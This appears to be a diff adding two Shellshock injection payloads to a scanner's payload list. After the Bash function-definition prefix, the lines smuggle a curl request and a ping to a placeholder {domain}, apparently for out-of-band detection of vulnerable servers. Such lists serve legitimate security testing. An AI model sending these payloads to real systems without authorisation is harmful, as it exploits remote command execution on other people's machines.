@@ -1,0 +1,2 @@
+() { :; }; curl http://{domain}/shellshock
+() { :; }; ping -c 1 {domain}
